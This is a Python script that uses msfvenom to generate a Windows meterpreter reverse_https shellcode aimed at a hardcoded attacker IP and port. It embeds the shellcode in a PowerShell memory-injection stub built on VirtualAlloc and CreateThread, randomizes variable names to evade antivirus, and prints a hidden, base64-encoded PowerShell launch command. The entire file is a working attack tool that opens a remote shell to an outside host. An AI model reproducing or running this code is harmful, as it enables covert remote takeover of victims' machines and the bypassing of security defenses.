#!/usr/bin/python

import base64
import re
import subprocess
import sys
import os
import shutil
import random
import string

payload = 'windows/meterpreter/reverse_https'
ipaddr = '192.168.83.175'
port = 8443

# generate a random string
#
def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters  # + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])


# generate the actual shellcode through msf
def generate_shellcode(payload, ipaddr, port):
    print(
        "[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
    #port = port.replace("LPORT=", "")

    # if we are using traditional payloads and not download_eec
    '''if not "exe=" in ipaddr:
        ipaddr = "LHOST={0}".format(ipaddr)
        port = "LPORT={0}".format(port)
    '''
    proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c".format(
        payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    repls = {
        ';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '',
             'unsignedcharbuf[]=': ''}
    data = reduce(lambda a, kv: a.replace(*kv),
                  iter(repls.items()), data).rstrip()

    if len(data) < 1:
        print(
            "[!] Length of shellcode was not generated. Check payload name and if Metasploit is working and try again.")
        print("Exiting....")
        sys.exit()
    return data

# generate shellcode attack and replace hex


def gen_shellcode_attack(payload, ipaddr, port):
    # regular payload generation stuff
    # generate our shellcode first
    shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
    # sub in \x for 0x
    shellcode = re.sub("\\\\x", "0x", shellcode)    
    # base counter
    counter = 0
    # count every four characters then trigger floater and write out data
    floater = ""
    # ultimate string
    newdata = ""
    for line in shellcode:
        floater += line
        counter += 1
        if counter == 4:
            newdata = newdata + floater + ","
            floater = ""
            counter = 0

    # here's our shellcode prepped and ready to go
    shellcode = newdata[:-1]


    # added random vars before and after to change strings - AV you are
    # seriously ridiculous.
    var1 = generate_random_string(3, 4)
    var2 = generate_random_string(3, 4)
    var3 = generate_random_string(3, 4)
    var4 = generate_random_string(3, 4)
    var5 = generate_random_string(3, 4)
    var6 = generate_random_string(3, 4)

    # one line shellcode injection with native x86 shellcode
    powershell_code = (
        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)

    print '[*] Running code through a lame var replace'
    powershell_code = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)

    #return powershell_code

    fuckav = base64.b64encode(powershell_code.encode('utf_16_le'))
    print "powershell -nop -win hidden -noni -enc " +fuckav

gen_shellcode_attack(payload, ipaddr, port)
